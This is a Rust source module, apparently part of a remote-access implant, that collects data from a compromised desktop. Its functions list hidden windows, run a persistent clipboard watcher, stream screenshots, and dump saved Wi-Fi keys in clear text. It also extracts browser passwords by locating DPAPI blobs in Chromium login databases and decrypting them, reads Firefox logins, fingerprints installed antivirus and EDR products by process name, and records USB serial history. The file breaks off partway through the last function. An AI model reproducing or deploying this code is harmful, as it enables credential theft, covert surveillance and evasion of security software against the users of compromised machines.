//! The senses of the desktop.
//!
//! A workstation has more to give than a shell: it has a window table, a
//! clipboard, a screen that moves, a wireless radio, browsers that keep
//! the passwords of the user, security software that watches the machine
//! and USB keys that carry the identity of the person.  These are the
//! tasks that answer for them.
//!
//! The tools of the platform are the shortest path to most of it: the
//! wireless keys, the security software, the USB keys and the browser
//! profiles live in places that a tool of the system knows and the
//! implant does not.  Where the platform has an API that says more than
//! its tools do -- the window table of Windows -- the API is used
//! directly, through the FFI, so the implant takes no dependency for it.
//!
//! Every platform answers with its own tools, and every family says what
//! it could not read.  A wireless key that belongs to another user of the
//! machine is not readable, a browser that is locked is not readable, and
//! the report says so instead of pretending that the machine has nothing
//! to give.

use crate::creds::Credential;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::Duration;

/// The file the queue of the watchers lives in.
const WATCH_FILE: &str = "watch.state";

/// How many items the queue of the watchers keeps.
const MAX_QUEUE: usize = 400;

/// The longest run of printable bytes the scanners accept.
const MIN_STRING: usize = 6;

// ---------------------------------------------------------------------------
// The shell of the platform
// ---------------------------------------------------------------------------

/// Run a command of the platform and return what it printed.
///
/// The tools of the system know the places the implant cannot reach: the
/// wireless profiles, the security software, the USB keys and the
/// browser profiles.  A tool that is not installed answers with an
/// error, and the caller says which tool was missing instead of
/// pretending that the machine has nothing to give.
fn run(cmd: &str, timeout_secs: u64) -> Option<String> {
    let outcome = crate::task::shell(cmd, timeout_secs);
    if outcome.out.is_empty() {
        return None;
    }
    Some(String::from_utf8_lossy(&outcome.out).to_string())
}

/// Run a command and return its bytes.
///
/// The capture of the screen is binary, so the error stream is thrown
/// away before the command runs: a warning of the tool in the middle of
/// a picture would corrupt it.
fn run_bytes(cmd: &str, timeout_secs: u64) -> Option<Vec<u8>> {
    let outcome = crate::task::shell(cmd, timeout_secs);
    if outcome.out.is_empty() {
        return None;
    }
    Some(outcome.out)
}

// ---------------------------------------------------------------------------
// The window table
// ---------------------------------------------------------------------------

/// The windows of the desktop.
///
/// One line per window: the process, the class, the title and whether it
/// is on the screen.  The title of a window is the name of the document
/// the user is working on, and the name of the process is the name of the
/// program.
#[cfg(windows)]
pub fn window_list() -> Result<String, String> {
    let mut rows: Vec<String> = Vec::new();
    unsafe {
        let param = &mut rows as *mut Vec<String> as *mut std::os::raw::c_void;
        win32::EnumWindows(collect_window, param);
    }
    if rows.is_empty() {
        return Err("the window table is empty: the session has no window".to_string());
    }
    let mut out = String::new();
    out.push_str(&format!("window.list: {} windows\n", rows.len()));
    for row in &rows {
        out.push_str("  ");
        out.push_str(row);
        out.push('\n');
    }
    Ok(out)
}

/// The window table of macOS.
///
/// The system has no command that lists the windows, so the list comes
/// from the accessibility of the system, which needs the permission of
/// the user: the report says what it got and what it did not.
#[cfg(target_os = "macos")]
pub fn window_list() -> Result<String, String> {
    let mut out = String::new();
    let front = run(
        "osascript -e 'tell application \"System Events\" to get name of first application process whose frontmost is true' 2>/dev/null",
        20,
    );
    match front {
        Some(text) => {
            out.push_str(&format!("window.list: the frontmost application is {}\n", text.trim()));
        }
        None => {
            out.push_str(
                "window.list: the accessibility of the system refused the question; the list of the windows needs the permission of the user\n",
            );
        }
    }
    let visible = run(
        "osascript -e 'tell application \"System Events\" to get name of every application process whose visible is true' 2>/dev/null",
        25,
    );
    match visible {
        Some(text) => {
            let names: Vec<&str> = text
                .trim()
                .split(',')
                .map(|item| item.trim())
                .filter(|item| !item.is_empty())
                .collect();
            out.push_str(&format!("window.list: {} visible applications\n", names.len()));
            for name in names {
                out.push_str(&format!("  {}\n", name));
            }
        }
        None => out.push_str("window.list: the list of the applications is not readable\n"),
    }
    Ok(out)
}

/// The window table of Linux.
///
/// The tools of the desktop are the way in: `wmctrl` knows the list, and
/// `xdotool` is the fallback.  A headless machine has neither, and the
/// report says so.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn window_list() -> Result<String, String> {
    if let Some(text) = run("wmctrl -lp 2>/dev/null", 20) {
        if !text.trim().is_empty() {
            let rows: Vec<&str> = text.lines().filter(|line| !line.trim().is_empty()).collect();
            let mut out = String::new();
            out.push_str(&format!("window.list: {} windows (wmctrl)\n", rows.len()));
            for row in rows {
                out.push_str("  ");
                out.push_str(row.trim());
                out.push('\n');
            }
            return Ok(out);
        }
    }
    if let Some(text) = run(
        "for id in $(xdotool search --onlyvisible --name '.' 2>/dev/null); do echo \"$id|$(xdotool getwindowname $id 2>/dev/null)\"; done",
        25,
    ) {
        let rows: Vec<&str> = text.lines().filter(|line| !line.trim().is_empty()).collect();
        if !rows.is_empty() {
            let mut out = String::new();
            out.push_str(&format!("window.list: {} windows (xdotool)\n", rows.len()));
            for row in rows {
                out.push_str("  ");
                out.push_str(row.trim());
                out.push('\n');
            }
            return Ok(out);
        }
    }
    Err(
        "the window table is not readable: the machine has neither wmctrl nor xdotool, and a headless session has no windows"
            .to_string(),
    )
}

/// The API of the window table of Windows.
#[cfg(windows)]
mod win32 {
    use std::os::raw::{c_int, c_void};

    pub type HWND = *mut c_void;
    pub type BOOL = i32;
    pub type DWORD = u32;
    pub type WCHAR = u16;

    #[repr(C)]
    pub struct RECT {
        pub left: c_int,
        pub top: c_int,
        pub right: c_int,
        pub bottom: c_int,
    }

    pub type EnumWindowsProc = extern "system" fn(HWND, *mut c_void) -> BOOL;

    #[link(name = "user32")]
    extern "system" {
        pub fn EnumWindows(callback: EnumWindowsProc, param: *mut c_void) -> BOOL;
        pub fn GetWindowTextW(hwnd: HWND, text: *mut WCHAR, max: c_int) -> c_int;
        pub fn GetClassNameW(hwnd: HWND, text: *mut WCHAR, max: c_int) -> c_int;
        pub fn GetWindowThreadProcessId(hwnd: HWND, pid: *mut DWORD) -> DWORD;
        pub fn IsWindowVisible(hwnd: HWND) -> BOOL;
        pub fn GetWindowRect(hwnd: HWND, rect: *mut RECT) -> BOOL;
    }
}

/// The callback of the window table.
///
/// The list is walked with `EnumWindows`, which every window of the
/// session carries: the visible ones and the hidden ones, because the
/// hidden ones are the interesting ones.
#[cfg(windows)]
extern "system" fn collect_window(hwnd: win32::HWND, param: *mut std::os::raw::c_void) -> win32::BOOL {
    let rows = unsafe { &mut *(param as *mut Vec<String>) };
    let mut text = [0u16; 512];
    let length = unsafe { win32::GetWindowTextW(hwnd, text.as_mut_ptr(), 512) };
    if length <= 0 {
        return 1;
    }
    let title = String::from_utf16_lossy(&text[..length as usize]);
    let mut class = [0u16; 256];
    let class_length = unsafe { win32::GetClassNameW(hwnd, class.as_mut_ptr(), 256) };
    let class_name = String::from_utf16_lossy(&class[..class_length.max(0) as usize]);
    let mut pid: win32::DWORD = 0;
    unsafe { win32::GetWindowThreadProcessId(hwnd, &mut pid) };
    let visible = unsafe { win32::IsWindowVisible(hwnd) } != 0;
    let mut rect = win32::RECT {
        left: 0,
        top: 0,
        right: 0,
        bottom: 0,
    };
    let placed = unsafe { win32::GetWindowRect(hwnd, &mut rect) } != 0;
    let size = if placed {
        format!("{}x{}", rect.right - rect.left, rect.bottom - rect.top)
    } else {
        String::from("-")
    };
    rows.push(format!(
        "{}|{}|{}|{}|{}",
        pid,
        if visible { "shown" } else { "hidden" },
        class_name,
        size,
        title
    ));
    1
}

// ---------------------------------------------------------------------------
// The clipboard of the desktop
// ---------------------------------------------------------------------------

/// The watcher of the clipboard.
///
/// The same model as the phone: the watcher is started, it keeps what
/// was copied in a queue that survives a reboot, and the operator polls
/// the queue.
pub fn clipboard_watch(action: &str, interval_ms: u64) -> Result<String, String> {
    match action {
        "start" => {
            start_watcher(interval_ms);
            Ok("clipboard.watch: the watcher of the clipboard is running\n".to_string())
        }
        "stop" => {
            stop_watcher();
            Ok("clipboard.watch: the watcher of the clipboard was stopped\n".to_string())
        }
        "poll" => {
            let items = drain_queue();
            if items.is_empty() {
                return Ok("clipboard.watch: the queue is empty\n".to_string());
            }
            let mut out = String::new();
            out.push_str(&format!("clipboard.watch: {} items\n", items.len()));
            for item in &items {
                out.push_str(item);
                out.push('\n');
            }
            Ok(out)
        }
        _ => {
            let mut out = String::new();
            out.push_str(&format!(
                "clipboard.watch: the watcher is {}\n",
                if watcher_running() { "running" } else { "stopped" }
            ));
            out.push_str(&format!(
                "clipboard.watch: the queue holds {} items\n",
                queue_len()
            ));
            Ok(out)
        }
    }
}

/// Whether the watcher runs.
fn watcher_running() -> bool {
    WATCHER.load(Ordering::SeqCst)
}

/// The flag of the watcher.
static WATCHER: AtomicBool = AtomicBool::new(false);

/// The last thing the watcher saw, so a copy that does not change is not
/// queued twice.
static LAST_SEEN: Mutex<Option<String>> = Mutex::new(None);

/// Start the watcher of the clipboard.
fn start_watcher(interval_ms: u64) {
    if watcher_running() {
        return;
    }
    WATCHER.store(true, Ordering::SeqCst);
    let wait = Duration::from_millis(interval_ms.clamp(250, 60_000));
    std::thread::spawn(move || {
        while watcher_running() {
            if let Ok(text) = read_clipboard() {
                let mut last = match LAST_SEEN.lock() {
                    Ok(guard) => guard,
                    Err(poisoned) => poisoned.into_inner(),
                };
                if last.as_deref() != Some(text.as_str()) {
                    *last = Some(text.clone());
                    drop(last);
                    queue_push("clipboard", &text);
                }
            }
            std::thread::sleep(wait);
        }
    });
}

/// Stop the watcher of the clipboard.
///
/// The end of the engagement calls it: a watcher that runs writes into
/// the state that is about to go.
pub fn stop_watcher() {
    WATCHER.store(false, Ordering::SeqCst);
}

/// Read the clipboard of the machine.
///
/// Windows and macOS have their own way; on Linux the clipboard belongs
/// to the desktop session, so the tools of the session read it.
#[cfg(any(windows, target_os = "macos"))]
fn read_clipboard() -> Result<String, String> {
    crate::desktop::clipboard()
}

/// Read the clipboard of the session of Linux.
#[cfg(not(any(windows, target_os = "macos")))]
fn read_clipboard() -> Result<String, String> {
    for cmd in [
        "xclip -o -selection clipboard 2>/dev/null",
        "wl-paste --no-newline 2>/dev/null",
        "xsel --clipboard --output 2>/dev/null",
    ] {
        if let Some(text) = run(cmd, 10) {
            if !text.trim().is_empty() {
                return Ok(text);
            }
        }
    }
    Err("the clipboard of the session is not readable: no tool of the session answered".to_string())
}

// ---------------------------------------------------------------------------
// The queue of the watchers
// ---------------------------------------------------------------------------

/// Where the queue of the watchers lives.
///
/// It sits next to the state of the persistence, so it follows the user
/// the implant runs as and survives a reboot.
fn watch_path() -> PathBuf {
    home().join(".umbra").join(WATCH_FILE)
}

/// Put an item into the queue.
fn queue_push(kind: &str, text: &str) {
    let path = watch_path();
    let mut items = read_queue(&path);
    items.push(format!("{}|{}|{}", kind, now_millis(), escape(text)));
    while items.len() > MAX_QUEUE {
        items.remove(0);
    }
    write_queue(&path, &items);
}

/// The items of the queue.
fn queue_len() -> usize {
    read_queue(&watch_path()).len()
}

/// Take the items of the queue.
fn drain_queue() -> Vec<String> {
    let path = watch_path();
    let items = read_queue(&path);
    write_queue(&path, &[]);
    items.iter().map(|item| queue_line(item)).collect()
}

/// Read the queue from the disk.
///
/// The items are kept as they are written: `kind|time|text`, and the text
/// is escaped.  The escape and the unescape are the two halves of one
/// round trip, and the queue has to survive it -- a queue that is read,
/// written and read again must hold the same items.
fn read_queue(path: &PathBuf) -> Vec<String> {
    match std::fs::read_to_string(path) {
        Ok(raw) => raw
            .lines()
            .filter(|line| !line.trim().is_empty())
            .map(|line| line.to_string())
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// Write the queue to the disk.
fn write_queue(path: &PathBuf, items: &[String]) {
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::write(path, items.join("\n"));
}

/// One item of the queue, as a line of the report.
fn queue_line(item: &str) -> String {
    let mut parts = item.splitn(3, '|');
    let kind = parts.next().unwrap_or("");
    let at = parts.next().unwrap_or("");
    let text = parts.next().unwrap_or("");
    format!("{} {} {}", kind, at, unescape(text))
}

/// Escape the separator of the queue.
fn escape(text: &str) -> String {
    text.replace('\\', "\\\\")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('|', "\\p")
}

/// Unescape the separator of the queue.
fn unescape(text: &str) -> String {
    let mut out = String::new();
    let mut chars = text.chars();
    while let Some(char) = chars.next() {
        if char == '\\' {
            match chars.next() {
                Some('n') => out.push('\n'),
                Some('r') => out.push('\r'),
                Some('p') => out.push('|'),
                Some('\\') => out.push('\\'),
                Some(other) => {
                    out.push('\\');
                    out.push(other);
                }
                None => out.push('\\'),
            }
            continue;
        }
        out.push(char);
    }
    out
}

/// The time in milliseconds, for the queue.
fn now_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0)
}

// ---------------------------------------------------------------------------
// The screen in motion
// ---------------------------------------------------------------------------

/// The screen of the machine, a picture at a time.
///
/// The frames travel as partial results, so a stream of the screen fits
/// through the frames of the protocol.
pub fn screen_stream(frames: usize, fps: u32) -> Result<Vec<Vec<u8>>, String> {
    let count = frames.clamp(1, 30);
    let wait = Duration::from_millis(1000 / u64::from(fps.clamp(1, 30).max(1)));
    let mut out = Vec::new();
    for index in 0..count {
        if index > 0 {
            std::thread::sleep(wait);
        }
        out.push(capture_screen()?);
    }
    Ok(out)
}

/// One picture of the screen of Windows and macOS.
#[cfg(any(windows, target_os = "macos"))]
fn capture_screen() -> Result<Vec<u8>, String> {
    crate::desktop::screen()
}

/// One picture of the screen of Linux.
#[cfg(not(any(windows, target_os = "macos")))]
fn capture_screen() -> Result<Vec<u8>, String> {
    for cmd in [
        "import -window root png:- 2>/dev/null",
        "scrot -z - 2>/dev/null",
        "maim -f png - 2>/dev/null",
    ] {
        if let Some(data) = run_bytes(cmd, 25) {
            if data.len() > 128 {
                return Ok(data);
            }
        }
    }
    Err(
        "the screen of the machine is not readable: none of import, scrot or maim is installed"
            .to_string(),
    )
}

// ---------------------------------------------------------------------------
// The wireless networks
// ---------------------------------------------------------------------------

/// The saved networks of the machine.
///
/// The saved networks carry the keys, and the keys belong to the user
/// who typed them: the implant runs as that user, so it reads what that
/// user may read, and says so when the key is hidden.
#[cfg(windows)]
pub fn wifi_profiles() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("wifi.profiles: the saved profiles (netsh)\n");
    match run("netsh wlan show profiles", 30) {
        Some(text) => {
            let names = wlan_profile_names(&text);
            out.push_str(&format!("wifi.profiles: {} saved profiles\n", names.len()));
            for name in &names {
                out.push_str(&format!("  profile: {}\n", name));
                let command = format!("netsh wlan show profile name=\"{}\" key=clear 2>nul", name);
                match run(&command, 30) {
                    Some(detail) => {
                        for line in detail.lines() {
                            let trimmed = line.trim();
                            if trimmed.starts_with("SSID")
                                || trimmed.starts_with("Authentication")
                                || trimmed.starts_with("Encryption")
                                || trimmed.contains("Key Content")
                            {
                                out.push_str(&format!("    {}\n", trimmed));
                            }
                        }
                    }
                    None => out.push_str("    the profile could not be read\n"),
                }
            }
        }
        None => out.push_str("wifi.profiles: the wireless radio did not answer (netsh)\n"),
    }
    if let Some(text) = run("netsh wlan show interfaces", 20) {
        for line in text.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with("Name")
                || trimmed.starts_with("State")
                || trimmed.starts_with("SSID")
                || trimmed.starts_with("BSSID")
                || trimmed.starts_with("Channel")
                || trimmed.starts_with("Signal")
            {
                out.push_str(&format!("wifi.profiles: {}\n", trimmed));
            }
        }
    }
    Ok(out)
}

/// The preferred networks of a mac.
///
/// The keys of the networks live in the keychain of the user, and the
/// implant says where they are instead of pretending to have them.
#[cfg(target_os = "macos")]
pub fn wifi_profiles() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("wifi.profiles: the preferred networks (networksetup)\n");
    match run("networksetup -listpreferredwirelessnetworks", 30) {
        Some(text) => {
            let rows: Vec<&str> = text
                .lines()
                .map(|line| line.trim())
                .filter(|line| !line.is_empty() && !line.starts_with("Preferred"))
                .collect();
            out.push_str(&format!("wifi.profiles: {} preferred networks\n", rows.len()));
            for row in rows {
                out.push_str(&format!("  {}\n", row));
            }
        }
        None => out.push_str("wifi.profiles: the wireless networks are not readable\n"),
    }
    out.push_str("wifi.profiles: the keys of the networks are in the keychain of the user\n");
    Ok(out)
}

/// The networks of a machine of Linux.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn wifi_profiles() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("wifi.profiles: the networks around the machine (nmcli)\n");
    match run("nmcli -t -f SSID,BSSID,SIGNAL,SECURITY device wifi list 2>/dev/null", 30) {
        Some(text) => {
            let rows: Vec<&str> = text
                .lines()
                .map(|line| line.trim())
                .filter(|line| !line.is_empty())
                .collect();
            out.push_str(&format!("wifi.profiles: {} networks in the air\n", rows.len()));
            for row in rows {
                out.push_str(&format!("  {}\n", row));
            }
        }
        None => out.push_str("wifi.profiles: the radio did not answer (nmcli)\n"),
    }
    out.push_str("wifi.profiles: the saved networks\n");
    match run("nmcli --show-secrets -t -f NAME,TYPE,DEVICE connection show 2>/dev/null", 30) {
        Some(text) => {
            let rows: Vec<&str> = text
                .lines()
                .map(|line| line.trim())
                .filter(|line| !line.is_empty())
                .collect();
            for row in rows {
                out.push_str(&format!("  {}\n", row));
            }
        }
        None => out.push_str("  the saved networks are not readable without the rights of the user\n"),
    }
    Ok(out)
}

/// The names of the saved profiles of Windows.
///
/// The list of `netsh` prints one profile per line, and the name is
/// behind the colon.
#[cfg(windows)]
fn wlan_profile_names(text: &str) -> Vec<String> {
    let mut names = Vec::new();
    for line in text.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix("All User Profile") {
            if let Some(name) = rest.split(':').nth(1) {
                let name = name.trim();
                if !name.is_empty() {
                    names.push(name.to_string());
                }
            }
        }
    }
    names
}

// ---------------------------------------------------------------------------
// The browsers
// ---------------------------------------------------------------------------

/// The credentials of the browsers of the machine.
///
/// The report is the shape of the credential report of the framework:
/// the accounts and the services are named, and the material itself is
/// only there when the operator asks for it.
pub fn browser_creds() -> Result<(String, Vec<Credential>), String> {
    let mut found: Vec<Credential> = Vec::new();
    let mut notes: Vec<String> = Vec::new();
    for (browser, path) in browser_files() {
        if !path.exists() {
            continue;
        }
        notes.push(format!("{}: {}", browser, path.display()));
        match chrome_login_data(&path, &browser) {
            Ok(mut entries) => found.append(&mut entries),
            Err(e) => notes.push(format!("{}: {}", browser, e)),
        }
    }
    for (browser, path) in firefox_logins() {
        if !path.exists() {
            continue;
        }
        notes.push(format!("{}: {}", browser, path.display()));
        match firefox_entries(&path, &browser) {
            Ok(mut entries) => found.append(&mut entries),
            Err(e) => notes.push(format!("{}: {}", browser, e)),
        }
    }
    if found.is_empty() && notes.is_empty() {
        return Err(
            "no browser profile of this user was found: the implant runs as a user that does not use one"
                .to_string(),
        );
    }
    let mut out = String::new();
    out.push_str(&format!(
        "browser.creds: {} pieces of material in {} profiles\n",
        found.len(),
        notes.len()
    ));
    for entry in &found {
        out.push_str(&format!(
            "  {} | {} | {} | confidence {} | {}\n",
            entry.kind, entry.target, entry.account, entry.confidence, entry.note
        ));
    }
    for note in &notes {
        out.push_str(&format!("browser.creds: {}\n", note));
    }
    if found.is_empty() {
        out.push_str(
            "browser.creds: the material itself is not readable: the databases of the browsers are locked to the user that wrote them\n",
        );
    }
    Ok((out, found))
}

/// The login databases of the Chromium browsers.
fn browser_files() -> Vec<(String, PathBuf)> {
    let mut out: Vec<(String, PathBuf)> = Vec::new();
    let local = if cfg!(target_os = "windows") {
        std::env::var("LOCALAPPDATA").map(PathBuf::from).unwrap_or_default()
    } else if cfg!(target_os = "macos") {
        home().join("Library/Application Support")
    } else {
        home().join(".config")
    };
    for (name, folder) in [
        ("chrome", "Google/Chrome"),
        ("edge", "Microsoft/Edge"),
        ("brave", "BraveSoftware/Brave-Browser"),
        ("chromium", "chromium"),
    ] {
        let base = local.join(folder).join("Default").join("Login Data");
        if base.exists() {
            out.push((name.to_string(), base));
        }
    }
    out
}

/// The login databases of Firefox.
fn firefox_logins() -> Vec<(String, PathBuf)> {
    let mut out: Vec<(String, PathBuf)> = Vec::new();
    let base = if cfg!(target_os = "windows") {
        std::env::var("APPDATA").map(PathBuf::from).unwrap_or_default()
    } else if cfg!(target_os = "macos") {
        home().join("Library/Application Support")
    } else {
        home().join(".mozilla")
    };
    let profiles = base.join("Firefox").join("Profiles");
    if let Ok(dirs) = std::fs::read_dir(&profiles) {
        for entry in dirs.flatten() {
            let path = entry.path().join("logins.json");
            if path.exists() {
                out.push(("firefox".to_string(), path));
            }
        }
    }
    out
}

/// The entries of a Chromium login database.
///
/// The database is a SQLite file and the implant carries no SQL, so the
/// scan reads the printable runs of the file: the addresses and the
/// accounts are stored in the clear, and the passwords are a blob of the
/// platform.  On Windows the blob is DPAPI, and the implant already
/// knows how to open one.
fn chrome_login_data(path: &PathBuf, browser: &str) -> Result<Vec<Credential>, String> {
    let data = std::fs::read(path).map_err(|e| format!("the database could not be read: {e}"))?;
    let strings = scan_strings(&data);
    let mut addresses: Vec<String> = Vec::new();
    for text in &strings {
        if text.starts_with("http://") || text.starts_with("https://") {
            if !addresses.iter().any(|item| item == text) {
                addresses.push(text.clone());
            }
        }
    }
    let blobs = dpapi_blobs(&data);
    let mut out: Vec<Credential> = Vec::new();
    for (index, blob) in blobs.iter().enumerate() {
        let target = addresses.get(index).cloned().unwrap_or_default();
        let mut entry = Credential::new("password", browser)
            .with_target(&target)
            .with_confidence(if target.is_empty() { 40 } else { 70 })
            .with_note("the password of the browser, in the order of the file");
        if let Some(plain) = open_dpapi(blob) {
            entry = entry.with_bytes(&plain);
        } else {
            entry = entry.with_note("the password is a blob of the platform and it did not open");
        }
        out.push(entry);
    }
    if out.is_empty() {
        return Err("the database holds no password of this user".to_string());
    }
    Ok(out)
}

/// The entries of the Firefox login file.
///
/// The file is JSON and the addresses and the accounts are in the clear;
/// the passwords are an encrypted blob of NSS, which needs the key
/// database of the profile.
fn firefox_entries(path: &PathBuf, browser: &str) -> Result<Vec<Credential>, String> {
    let raw = std::fs::read_to_string(path).map_err(|e| format!("the file could not be read: {e}"))?;
    let mut out: Vec<Credential> = Vec::new();
    for chunk in raw.split("\"hostname\"") {
        let host = chunk
            .split('"')
            .nth(3)
            .unwrap_or("")
            .trim()
            .to_string();
        if host.is_empty() {
            continue;
        }
        let account = chunk
            .split("\"encryptedUsername\"")
            .nth(1)
            .and_then(|rest| rest.split('"').nth(2))
            .unwrap_or("")
            .trim()
            .to_string();
        out.push(
            Credential::new("password", browser)
                .with_target(&host)
                .with_account(&account)
                .with_confidence(60)
                .with_note("the password of the browser is an encrypted blob of NSS"),
        );
    }
    if out.is_empty() {
        return Err("the file holds no login of this user".to_string());
    }
    Ok(out)
}

/// The blobs of DPAPI in a file.
///
/// The databases of the browsers mark the blobs of Windows with the
/// word "DPAPI" and the length of the blob, so they can be found without
/// a parser of the database.
fn dpapi_blobs(data: &[u8]) -> Vec<Vec<u8>> {
    let mut out: Vec<Vec<u8>> = Vec::new();
    let marker = b"DPAPI";
    let mut index = 0;
    while index + 13 <= data.len() {
        if &data[index..index + 5] == marker {
            let version = u32::from_le_bytes([data[index + 5], data[index + 6], data[index + 7], data[index + 8]]);
            let length = u32::from_le_bytes([
                data[index + 9],
                data[index + 10],
                data[index + 11],
                data[index + 12],
            ]) as usize;
            if (version == 1 || version == 2) && length > 0 && length < 1 << 20 {
                let start = index + 13;
                if start + length <= data.len() {
                    out.push(data[start..start + length].to_vec());
                    index = start + length;
                    continue;
                }
            }
        }
        index += 1;
    }
    out
}

/// Open a blob of DPAPI with the rights of the user the implant runs as.
#[cfg(windows)]
fn open_dpapi(blob: &[u8]) -> Option<Vec<u8>> {
    let encoded = crate::ws::base64_encode(blob);
    crate::post::windows::dpapi_unprotect(&encoded).ok()
}

/// The blob of a platform that is not Windows stays closed.
#[cfg(not(windows))]
fn open_dpapi(blob: &[u8]) -> Option<Vec<u8>> {
    let _ = blob;
    None
}

/// The printable runs of a file, the strings of the file.
fn scan_strings(data: &[u8]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut current = String::new();
    for byte in data {
        if *byte >= 0x20 && *byte < 0x7f {
            current.push(*byte as char);
            continue;
        }
        if current.len() >= MIN_STRING {
            out.push(std::mem::take(&mut current));
        } else {
            current.clear();
        }
    }
    if current.len() >= MIN_STRING {
        out.push(current);
    }
    out
}

// ---------------------------------------------------------------------------
// The security software
// ---------------------------------------------------------------------------

/// The security software of the machine.
///
/// The operator wants to know what watches the machine before it does
/// anything: the answer is the list of the products, and it is a hint,
/// not a proof -- a product that is installed may be turned off.
#[cfg(windows)]
pub fn av_survey() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("av.survey: the products of the security centre\n");
    let command = "powershell -NoProfile -Command \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | ForEach-Object { $_.displayName + '|' + $_.productState }\" 2>&1";
    match run(command, 60) {
        Some(text) => {
            let rows: Vec<&str> = text
                .lines()
                .map(|line| line.trim())
                .filter(|line| !line.is_empty())
                .collect();
            if rows.is_empty() {
                out.push_str("av.survey: the security centre did not answer\n");
            } else {
                for row in rows {
                    out.push_str(&format!("  {}\n", row));
                }
            }
        }
        None => out.push_str("av.survey: the security centre could not be asked\n"),
    }
    out.push_str("av.survey: the services of the security software\n");
    match run("sc query type= service state= all 2>nul | findstr /i \"AV anti malware defender endpoint security\"", 40) {
        Some(text) => {
            for line in text.lines().map(|line| line.trim()).filter(|line| !line.is_empty()) {
                out.push_str(&format!("  {}\n", line));
            }
        }
        None => out.push_str("  the services could not be listed\n"),
    }
    Ok(out)
}

/// The security software of a mac.
#[cfg(target_os = "macos")]
pub fn av_survey() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("av.survey: the security software of the machine\n");
    match run("ps -A -o comm= 2>/dev/null | egrep -i 'xprotect|gatekeeper|sophos|symantec|crowdstrike|falcon|jamf|bitdefender|kaspersky|eset' | sort -u", 30) {
        Some(text) => {
            for line in text.lines().map(|line| line.trim()).filter(|line| !line.is_empty()) {
                out.push_str(&format!("  {}\n", line));
            }
        }
        None => out.push_str("  no third party security software was found\n"),
    }
    out.push_str("av.survey: the gatekeeper of the system is on\n");
    Ok(out)
}

/// The security software of a machine of Linux.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn av_survey() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("av.survey: the security software of the machine\n");
    match run("ps -A -o comm= 2>/dev/null | egrep -i 'falcon|crowdstrike|sentinel|clamav|osquery|wazuh|carbonblack|bitdefender|kaspersky|eset|sophos|auditd|apparmor' | sort -u", 30) {
        Some(text) => {
            for line in text.lines().map(|line| line.trim()).filter(|line| !line.is_empty()) {
                out.push_str(&format!("  {}\n", line));
            }
        }
        None => out.push_str("  no security software was found in the process table\n"),
    }
    out.push_str("av.survey: the seatbelt of Linux\n");
    match run("aa-status 2>/dev/null | head -3", 20) {
        Some(text) => out.push_str(&format!("  {}\n", text.trim())),
        None => out.push_str("  the seatbelt did not answer\n"),
    }
    Ok(out)
}

// ---------------------------------------------------------------------------
// The USB keys
// ---------------------------------------------------------------------------

/// The USB devices of the machine, and the ones that were there before.
///
/// The history of the USB keys is the fingerprint of the person: the
/// serial number of a key is on the label of the key, and it is in the
/// registry of the machine for as long as the machine remembers.
#[cfg(windows)]
pub fn usb_history() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("usb.history: the keys that were plugged in (USBSTOR)\n");
    match run("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\" /s 2>nul", 40) {
        Some(text) => {
            let rows: Vec<&str> = text
                .lines()
                .map(|line| line.trim())
                .filter(|line| !line.is_empty() && !line.starts_with("HKEY"))
                .collect();
            out.push_str(&format!("usb.history: {} values in the history\n", rows.len()));
            for row in rows.iter().take(200) {
                out.push_str(&format!("  {}\n", row));
            }
        }
        None => out.push_str("usb.history: the history of the USB keys is not readable\n"),
    }
    out.push_str("usb.history: the devices that are attached now\n");
    match run("powershell -NoProfile -Command \"Get-PnpDevice -Class USB -Status OK | Select-Object -ExpandProperty FriendlyName\" 2>&1", 45) {
        Some(text) => {
            for line in text.lines().map(|line| line.trim()).filter(|line| !line.is_empty()) {
                out.push_str(&format!("  {}\n", line));
            }
        }
        None => out.push_str("  the attached devices could not be listed\n"),
    }
    Ok(out)
}

/// The USB devices of a mac.
#[cfg(target_os = "macos")]
pub fn usb_history() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("usb.history: the devices that are attached now\n");
    match run("ioreg -p IOUSB -w 0 -l 2>/dev/null | egrep -i '\"USB Product Name\"|\"USB Serial Number\"|\"USB Vendor Name\"' | head -60", 30) {
        Some(text) => {
            for line in text.lines().map(|line| line.trim()).filter(|line| !line.is_empty()) {
                out.push_str(&format!("  {}\n", line));
            }
        }
        None => out.push_str("  the devices could not be listed\n"),
    }
    Ok(out)
}

/// The USB devices of a machine of Linux.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn usb_history() -> Result<String, String> {
    let mut out = String::new();
    out.push_str("usb.history: the devices of the bus\n");
    match run("lsusb 2>/dev/null || ls /sys/bus/usb/devices 2>/dev/null", 20) {
        Some(text) => {
            for line in text.lines().map(|line| line.trim()).filter(|line| !line.is_empty()) {
                out.push_str(&format!("  {}\n", line));
            }
        }
        None => out.push_str("  the bus could not be read\n"),
    }
    out.push_str("usb.history: the serial numbers of the devices\n");
    if let Ok(entries) = std::fs::read_dir("/sys/bus/usb/devices") {
        for entry in entries.flatten() {
            let product = std::fs::read_to_string(entry.path().join("product")).unwrap_or_default();
            let serial = std::fs::read_to_string(entry.path().join("serial")).unwrap_or_default();
            if !product.trim().is_empty() || !serial.trim().is_empty() {
                out.push_str(&format!(
                    "  {} | serial {}\n",
                    product.trim(),
                    serial.trim()
                ));
            }
        }
    }
